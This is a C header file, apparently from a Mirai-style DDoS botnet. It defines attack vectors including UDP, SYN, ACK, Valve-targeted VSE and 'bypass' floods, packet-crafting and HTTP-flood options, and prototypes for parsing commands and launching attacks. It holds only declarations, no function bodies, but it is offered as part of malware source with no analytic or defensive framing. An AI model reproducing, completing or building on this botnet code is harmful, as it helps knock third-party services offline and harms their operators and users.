#pragma once

#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>

#include "includes.h"
#include "protocol.h"

#define ATTACK_CONCURRENT_MAX   20

#define MAX_FDS 1000

int pid1, pid2; // Attack initializer

struct attack_target {
    struct sockaddr_in sock_addr;
    ipv4_t addr;
    uint8_t netmask;
};

struct attack_option {
    char *val;
    uint8_t key;
};

typedef void (*ATTACK_FUNC) (uint8_t, struct attack_target *, uint8_t, struct attack_option *);
typedef uint8_t ATTACK_VECTOR;

struct Attack {
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len;
    struct attack_target *targs;
    uint8_t opts_len;
    struct attack_option *opts;
};

#define ATK_VEC_UDP        0  /* Straight up UDP flood */
#define ATK_VEC_SYN        1  /* SYN flood with options */
#define ATK_VEC_ACK        2  /* ACK flood */
#define ATK_VEC_UDP_PLAIN  3  /* Plain UDP flood optimized for speed */
#define ATK_VEC_VSE        4  /* UDP Flood for Valve */
#define ATK_VEC_TCP_BYPASS 5  /* TCP bypass flood */
#define ATK_VEC_UDP_CUSTOM 6  /* UDP custom flood */
#define ATK_VEC_UDP_BYPASS 7  /* UDP bypass flood */
#define ATK_VEC_TCP        8  /* Actual TCP raw flood */

#define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
#define ATK_OPT_PAYLOAD_RAND    1   // Should we randomize the packet data contents?
#define ATK_OPT_IP_TOS          2   // tos field in IP header
#define ATK_OPT_IP_IDENT        3   // ident field in IP header
#define ATK_OPT_IP_TTL          4   // ttl field in IP header
#define ATK_OPT_IP_DF           5   // Dont-Fragment bit set
#define ATK_OPT_SPORT           6   // Should we force a source port? (0 = random)
#define ATK_OPT_DPORT           7   // Should we force a dest port? (0 = random)
#define ATK_OPT_DOMAIN          8   // Domain name for DNS attack
#define ATK_OPT_DNS_HDR_ID      9   // Domain name header ID
#define ATK_OPT_TCPCC           10  // TCP congestion control
#define ATK_OPT_URG             11  // TCP URG header flag
#define ATK_OPT_ACK             12  // TCP ACK header flag
#define ATK_OPT_PSH             13  // TCP PSH header flag
#define ATK_OPT_RST             14  // TCP RST header flag
#define ATK_OPT_SYN             15  // TCP SYN header flag
#define ATK_OPT_FIN             16  // TCP FIN header flag
#define ATK_OPT_SEQRND          17  // Should we force the sequence number? (TCP only)
#define ATK_OPT_ACKRND          18  // Should we force the ack number? (TCP only)
#define ATK_OPT_GRE_CONSTIP     19  // Should the encapsulated destination address be the same as the target?
#define ATK_OPT_METHOD		20  // Method for HTTP flood
#define ATK_OPT_POST_DATA	21  // Any data to be posted with HTTP flood
#define ATK_OPT_PATH            22  // The path for the HTTP flood
#define ATK_OPT_HTTPS           23  // Is this URL SSL/HTTPS?
#define ATK_OPT_CONNS           24  // Number of sockets to use
#define ATK_OPT_SOURCE          25  // Source IP
#define ATK_OPT_MIN_SIZE        26  // minimum packet size
#define ATK_OPT_MAX_SIZE        27  // maximum packet size
#define ATK_OPT_PAYLOAD_ONE     28  // custom payload
#define ATK_OPT_PAYLOAD_REPEAT  29  // how many times to repeat?

struct attack_method {
    ATTACK_FUNC func;
    ATTACK_VECTOR vector;
};

struct attack_stomp_data {
    ipv4_t addr;
    uint32_t seq, ack_seq;
    port_t sport, dport;
};

BOOL attack_init(void);
void attack_kill_all(void);
int attack_parse(const char *buf, int len, struct Attack *attack);
void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
int attack_get_opt_int(uint8_t, struct attack_option *, uint8_t, int);
uint32_t attack_get_opt_ip(uint8_t, struct attack_option *, uint8_t, uint32_t);

/* Actual attacks */
void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_custom(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_bypass(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
void free_opts(struct attack_option *, int);
